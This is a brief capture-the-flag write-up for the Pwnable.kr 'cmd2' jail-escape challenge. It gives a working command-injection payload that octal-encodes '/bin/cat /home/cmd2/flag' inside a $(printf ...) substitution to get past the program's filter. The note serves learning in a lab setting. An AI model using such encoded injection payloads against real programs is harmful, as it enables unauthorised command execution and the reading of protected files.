---
title: Pwnable.kr Cmd2
date: 2022-08-20T19:28:06+02:00
tags: ['cs/security']
aliases: ['']
---

Similar to [[notes/Pwnable.kr Cmd1 | cmd1]], this one is another jail escape. I am not
going to go too much into details, but we can run the following:

```sh
./cmd2 '$(printf "\057\142\151\156\057\143\141\164\040\057\150\157\155\145\057\143\155\144\062\057\146\154\141\147")'
```

Which executes the command below:

```sh
/bin/cat /home/cmd2/flag
```

> [!info] Take note

> The reason we use `\<octal>` instead of `\x<hex>` is because the first one is
> more standard we the cmd is run in dash shell.

